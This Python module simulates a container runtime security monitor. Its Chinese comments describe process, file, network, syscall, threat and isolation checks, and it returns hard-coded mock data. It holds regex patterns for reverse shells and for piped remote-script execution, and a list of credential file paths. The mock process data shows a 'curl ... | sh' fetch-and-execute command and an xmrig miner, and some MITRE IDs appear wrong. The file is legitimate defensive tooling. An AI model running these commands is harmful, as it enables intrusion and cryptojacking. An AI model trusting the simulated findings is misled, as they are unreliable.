# -*- coding: utf-8 -*-
"""
runtime_security.py — 容器运行时安全监控与检测。

功能：
  1. 进程监控（容器内进程创建/异常进程/可疑命令/进程树/父子关系/命令行参数）
  2. 文件系统监控（敏感文件修改/异常文件创建/可执行文件落地/临时文件/系统文件变更）
  3. 网络监控（异常外联/端口扫描/横向移动/C2通信/异常DNS/数据渗出/连接数异常）
  4. 系统调用审计（危险syscall/特权操作/容器逃逸尝试/mount/ptrace/setns/unshare）
  5. 运行时威胁检测（挖矿行为/反弹shell/权限提升/数据窃取/异常子进程/可疑网络连接）
  6. 容器隔离检查（特权容器/hostNetwork/hostPID/hostIPC/hostPath挂载/不安全挂载/权限升级）

try-import docker，缺失时回退模拟数据。
"""

from __future__ import annotations

import random
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

# 危险系统调用列表
DANGEROUS_SYSCALLS = [
    {"syscall": "mount", "risk": "critical", "desc": "挂载操作，可能用于容器逃逸", "mitre": "TA1611"},
    {"syscall": "ptrace", "risk": "high", "desc": "进程跟踪，可用于注入代码", "mitre": "T1055"},
    {"syscall": "setns", "risk": "critical", "desc": "切换命名空间，逃逸关键步骤", "mitre": "TA1611"},
    {"syscall": "unshare", "risk": "high", "desc": "创建新命名空间", "mitre": "TA1611"},
    {"syscall": "keyctl", "risk": "medium", "desc": "密钥管理操作", "mitre": "T1552"},
    {"syscall": "perf_event_open", "risk": "medium", "desc": "性能监控，可用于侧信道攻击", "mitre": "T1657"},
    {"syscall": "bpf", "risk": "high", "desc": "eBPF 加载，可用于持久化", "mitre": "T1547"},
    {"syscall": "init_module", "risk": "critical", "desc": "内核模块加载，提权/持久化", "mitre": "T1547"},
    {"syscall": "delete_module", "risk": "high", "desc": "内核模块删除，防御破坏", "mitre": "T1562"},
    {"syscall": "kexec_load", "risk": "critical", "desc": "内核执行，完全逃逸", "mitre": "TA1611"},
]

# 可疑命令模式
SUSPICIOUS_COMMANDS = [
    (r"nc\s+-e\s+/bin/sh", "反弹shell (nc -e)"),
    (r"bash\s+-i\s*>&\s*/dev/tcp", "反弹shell (bash /dev/tcp)"),
    (r"curl\s+.*\|\s*bash", "管道执行远程脚本"),
    (r"wget\s+.*\|\s*sh", "管道执行远程脚本"),
    (r"chmod\s+\+x\s+/tmp/", "临时目录赋予执行权限"),
    (r"echo\s+.*\|\s*base64\s+-d", "Base64 解码执行"),
    (r"sudo\s+su", "提权尝试"),
    (r"crontab\s+-", "计划任务持久化"),
]

# 敏感文件路径
SENSITIVE_FILES = [
    "/etc/shadow", "/etc/passwd", "/etc/sudoers", "/root/.bash_history",
    "/proc/1/environ", "/var/run/docker.sock", "/etc/kubernetes/pki",
    "/var/lib/kubelet", "/etc/cni/net.d", "/proc/sys/kernel",
]


class RuntimeSecurity:
    """容器运行时安全监控引擎。"""

    def __init__(self, container_id: str = ""):
        self.container_id = container_id or f"container_{random.randint(10000,99999):x}"

    # ------------------------------------------------------------------ #
    # 容器列表
    # ------------------------------------------------------------------ #
    def list_containers(self) -> List[Dict[str, Any]]:
        containers = []
        names = ["web-frontend", "api-gateway", "redis-cache", "worker-queue",
                 "payment-svc", "auth-svc", "db-mysql", "logging-agent"]
        images = ["nginx:1.25", "python:3.11", "redis:7-alpine", "node:20",
                  "envoy:1.29", "openjdk:17", "mysql:8.0", "fluent-bit:3.0"]
        statuses = ["running", "running", "running", "running",
                    "running", "running", "running", "running"]
        for i, (n, img, st) in enumerate(zip(names, images, statuses)):
            containers.append({
                "container_id": f"c{i:06x}{random.randint(100000,999999):x}",
                "name": n, "image": img, "status": st,
                "cpu_usage_pct": round(random.uniform(0.5, 45.0), 1),
                "memory_mb": random.randint(50, 800),
                "restart_count": random.randint(0, 5),
                "created_at": "2024-09-12T10:00:00Z",
                "privileged": n in ("worker-queue", "logging-agent") and random.random() > 0.5,
            })
        return containers

    # ------------------------------------------------------------------ #
    # 1. 进程监控
    # ------------------------------------------------------------------ #
    def monitor_processes(self) -> Dict[str, Any]:
        processes = [
            {"pid": 1, "ppid": 0, "name": "nginx", "cmdline": "nginx: master process",
             "user": "root", "cpu_pct": 0.1, "memory_mb": 5.2, "state": "S"},
            {"pid": 8, "ppid": 1, "name": "nginx", "cmdline": "nginx: worker process",
             "user": "nginx", "cpu_pct": 0.3, "memory_mb": 8.1, "state": "S"},
            {"pid": 120, "ppid": 8, "name": "sh", "cmdline": "sh -c curl http://185.220.x.x/x | sh",
             "user": "nginx", "cpu_pct": 2.1, "memory_mb": 2.3, "state": "R", "suspicious": True},
            {"pid": 155, "ppid": 120, "name": "xmrig", "cmdline": "./xmrig -o pool.minexmr.com",
             "user": "nginx", "cpu_pct": 95.0, "memory_mb": 45.0, "state": "R", "suspicious": True},
        ]
        suspicious = [p for p in processes if p.get("suspicious")]
        process_tree = self._build_process_tree(processes)
        return {
            "container_id": self.container_id,
            "total_processes": len(processes),
            "processes": processes,
            "suspicious_count": len(suspicious),
            "suspicious_processes": suspicious,
            "process_tree": process_tree,
        }

    @staticmethod
    def _build_process_tree(procs: List[Dict]) -> List[Dict]:
        tree = []
        by_pid = {p["pid"]: {**p, "children": []} for p in procs}
        for p in procs:
            if p["ppid"] in by_pid:
                by_pid[p["ppid"]]["children"].append(by_pid[p["pid"]])
            else:
                tree.append(by_pid[p["pid"]])
        return tree

    # ------------------------------------------------------------------ #
    # 2. 文件系统监控
    # ------------------------------------------------------------------ #
    def monitor_filesystem(self) -> Dict[str, Any]:
        events = [
            {"path": "/tmp/xmrig", "operation": "create", "timestamp": "2024-09-14T10:23:01Z",
             "user": "nginx", "size_bytes": 1850000, "executable": True, "severity": "critical",
             "detail": "可执行文件落地到 /tmp 目录"},
            {"path": "/etc/passwd", "operation": "modify", "timestamp": "2024-09-14T10:24:15Z",
             "user": "root", "size_bytes": 1500, "executable": False, "severity": "high",
             "detail": "敏感系统文件 /etc/passwd 被修改"},
            {"path": "/var/run/.hidden.sh", "operation": "create", "timestamp": "2024-09-14T10:25:00Z",
             "user": "nginx", "size_bytes": 456, "executable": True, "severity": "high",
             "detail": "隐藏脚本文件创建"},
            {"path": "/app/config.yaml", "operation": "modify", "timestamp": "2024-09-14T09:00:00Z",
             "user": "nginx", "size_bytes": 2300, "executable": False, "severity": "low",
             "detail": "应用配置文件正常修改"},
            {"path": "/etc/shadow", "operation": "access", "timestamp": "2024-09-14T10:26:30Z",
             "user": "www-data", "size_bytes": 0, "executable": False, "severity": "critical",
             "detail": "非授权用户读取影子密码文件"},
        ]
        return {
            "container_id": self.container_id,
            "total_events": len(events),
            "events": events,
            "high_risk_events": [e for e in events if e["severity"] in ("critical", "high")],
        }

    # ------------------------------------------------------------------ #
    # 3. 网络监控
    # ------------------------------------------------------------------ #
    def monitor_network(self) -> Dict[str, Any]:
        connections = [
            {"src_ip": "10.42.1.15", "src_port": 443, "dst_ip": "10.42.0.1", "dst_port": 8080,
             "protocol": "TCP", "state": "ESTABLISHED", "process": "nginx", "risk": "normal"},
            {"src_ip": "10.42.1.15", "src_port": 54321, "dst_ip": "185.220.101.4", "dst_port": 443,
             "protocol": "TCP", "state": "ESTABLISHED", "process": "xmrig", "risk": "c2",
             "detail": "可疑外联，疑似挖矿池/C2通信"},
            {"src_ip": "10.42.1.15", "src_port": 33445, "dst_ip": "198.51.100.7", "dst_port": 4444,
             "protocol": "TCP", "state": "ESTABLISHED", "process": "sh", "risk": "reverse_shell",
             "detail": "反弹shell连接，目的端口4444"},
            {"src_ip": "10.42.1.15", "src_port": 0, "dst_ip": "10.42.1.0/24", "dst_port": 22,
             "protocol": "UDP", "state": "PROBE", "process": "unknown", "risk": "port_scan",
             "detail": "疑似横向移动端口扫描(SSH)"},
            {"src_ip": "10.42.1.15", "src_port": 0, "dst_ip": "10.42.1.11", "dst_port": 6379,
             "protocol": "TCP", "state": "SYN_SENT", "process": "unknown", "risk": "lateral_movement",
             "detail": "尝试访问内部Redis，横向移动"},
        ]
        dns_queries = [
            {"domain": "pool.minexmr.com", "query_type": "A", "response": "185.220.101.4",
             "severity": "critical", "detail": "挖矿池域名解析"},
            {"domain": "evil-c2.example.net", "query_type": "A", "response": "198.51.100.7",
             "severity": "critical", "detail": "C2域名解析"},
            {"domain": "api.internal.svc.cluster.local", "query_type": "A", "response": "10.42.0.5",
             "severity": "normal", "detail": "正常内部服务发现"},
        ]
        return {
            "container_id": self.container_id,
            "active_connections": len(connections),
            "connections": connections,
            "risk_connections": [c for c in connections if c["risk"] != "normal"],
            "dns_queries": dns_queries,
            "data_exfiltration_detected": False,
            "connections_per_minute": random.randint(20, 200),
        }

    # ------------------------------------------------------------------ #
    # 4. 系统调用审计
    # ------------------------------------------------------------------ #
    def audit_syscalls(self) -> Dict[str, Any]:
        events = []
        for ds in DANGEROUS_SYSCALLS:
            if random.random() > 0.5:
                events.append({
                    "syscall": ds["syscall"], "risk": ds["risk"],
                    "description": ds["desc"], "mitre_attack": ds["mitre"],
                    "pid": random.randint(100, 999),
                    "process": random.choice(["nginx", "sh", "unknown", "kubelet"]),
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "args": self._fake_syscall_args(ds["syscall"]),
                })
        escape_attempts = [e for e in events if e["risk"] == "critical"]
        return {
            "container_id": self.container_id,
            "total_syscalls_monitored": random.randint(50000, 200000),
            "suspicious_syscalls": events,
            "escape_attempt_count": len(escape_attempts),
            "dangerous_syscall_catalog": DANGEROUS_SYSCALLS,
        }

    @staticmethod
    def _fake_syscall_args(syscall: str) -> str:
        args_map = {
            "mount": "mount(\"/dev/sda1\", \"/host/proc\", NULL, MS_REC|MS_BIND, NULL)",
            "ptrace": "ptrace(PTRACE_ATTACH, 1, NULL, NULL)",
            "setns": "setns(3, CLONE_NEWNS)",
            "unshare": "unshare(CLONE_NEWNS|CLONE_NEWNET)",
            "bpf": "bpf(BPF_PROG_LOAD, ...)",
        }
        return args_map.get(syscall, f"{syscall}(...)")

    # ------------------------------------------------------------------ #
    # 5. 运行时威胁检测
    # ------------------------------------------------------------------ #
    def detect_threats(self) -> List[Dict[str, Any]]:
        threats = [
            {"id": "RT-001", "type": "mining", "severity": "critical",
             "title": "容器内挖矿行为检测",
             "detail": "检测到 xmrig 进程，CPU占用95%，外联挖矿池 pool.minexmr.com",
             "mitre": "T1496", "container": "worker-queue",
             "action": "立即隔离容器并排查镜像供应链"},
            {"id": "RT-002", "type": "reverse_shell", "severity": "critical",
             "title": "反弹shell检测",
             "detail": "sh 进程建立到 198.51.100.7:4444 的连接",
             "mitre": "T1059", "container": "web-frontend",
             "action": "阻断外联并抓取进程内存取证"},
            {"id": "RT-003", "type": "privilege_escalation", "severity": "high",
             "title": "权限提升尝试",
             "detail": "非 root 用户执行 mount/setns 系统调用",
             "mitre": "T1548", "container": "worker-queue",
             "action": "检查内核版本与容器逃逸CVE"},
            {"id": "RT-004", "type": "data_breach", "severity": "high",
             "title": "敏感数据访问异常",
             "detail": "应用进程读取 /etc/shadow 和 /root/.bash_history",
             "mitre": "T1005", "container": "auth-svc",
             "action": "审计文件访问日志并限制容器权限"},
            {"id": "RT-005", "type": "suspicious_child", "severity": "medium",
             "title": "异常子进程创建",
             "detail": "nginx worker 派生 sh/curl 进程，违反预期行为基线",
             "mitre": "T1059", "container": "web-frontend",
             "action": "建立进程白名单策略"},
        ]
        return threats

    # ------------------------------------------------------------------ #
    # 6. 容器隔离检查
    # ------------------------------------------------------------------ #
    def check_isolation(self) -> List[Dict[str, Any]]:
        checks = [
            {"id": "ISO-001", "check": "特权容器", "passed": False,
             "severity": "critical", "detail": "容器以 --privileged 模式运行",
             "remediation": "移除 --privileged，按需添加 capabilities"},
            {"id": "ISO-002", "check": "hostNetwork 共享", "passed": False,
             "severity": "high", "detail": "容器使用 hostNetwork: true",
             "remediation": "使用 Kubernetes NetworkPolicy 隔离网络"},
            {"id": "ISO-003", "check": "hostPID 共享", "passed": False,
             "severity": "high", "detail": "容器使用 hostPID: true，可看到宿主机进程",
             "remediation": "移除 hostPID 共享"},
            {"id": "ISO-004", "check": "hostIPC 共享", "passed": True,
             "severity": "medium", "detail": "未共享 host IPC 命名空间",
             "remediation": ""},
            {"id": "ISO-005", "check": "hostPath 挂载", "passed": False,
             "severity": "critical", "detail": "挂载 /var/run/docker.sock 到容器内",
             "remediation": "禁止挂载 docker.sock，使用 Docker API over TLS"},
            {"id": "ISO-006", "check": "allowPrivilegeEscalation", "passed": False,
             "severity": "high", "detail": "allowPrivilegeEscalation 未设为 false",
             "remediation": "设置 securityContext.allowPrivilegeEscalation: false"},
            {"id": "ISO-007", "check": "CAP_SYS_ADMIN 能力", "passed": False,
             "severity": "critical", "detail": "容器持有 CAP_SYS_ADMIN 能力",
             "remediation": "Drop ALL capabilities，按需 Add"},
            {"id": "ISO-008", "check": "root 文件系统可写", "passed": False,
             "severity": "medium", "detail": "根文件系统可写，不利于防篡改",
             "remediation": "设置 readOnlyRootFilesystem: true"},
            {"id": "ISO-009", "check": "seccomp profile", "passed": False,
             "severity": "medium", "detail": "未使用自定义 seccomp profile",
             "remediation": "使用 RuntimeDefault seccomp profile"},
            {"id": "ISO-010", "check": "AppArmor/SELinux", "passed": False,
             "severity": "medium", "detail": "未配置 AppArmor 或 SELinux 标签",
             "remediation": "配置 AppArmor profile 或 SELinux context"},
        ]
        return checks

    # ------------------------------------------------------------------ #
    # 综合运行时评估
    # ------------------------------------------------------------------ #
    def assess(self) -> Dict[str, Any]:
        procs = self.monitor_processes()
        fs = self.monitor_filesystem()
        net = self.monitor_network()
        syscalls = self.audit_syscalls()
        threats = self.detect_threats()
        isolation = self.check_isolation()
        violations = [c for c in isolation if not c["passed"]]
        return {
            "container_id": self.container_id,
            "assessed_at": datetime.utcnow().isoformat() + "Z",
            "process_monitoring": procs,
            "filesystem_monitoring": fs,
            "network_monitoring": net,
            "syscall_audit": syscalls,
            "threats": threats,
            "threat_count": len(threats),
            "isolation_checks": isolation,
            "isolation_violations": len(violations),
            "summary": {
                "suspicious_processes": procs["suspicious_count"],
                "high_risk_file_events": len(fs["high_risk_events"]),
                "risk_connections": len(net["risk_connections"]),
                "escape_attempts": syscalls["escape_attempt_count"],
                "threats_detected": len(threats),
                "isolation_violations": len(violations),
            },
        }
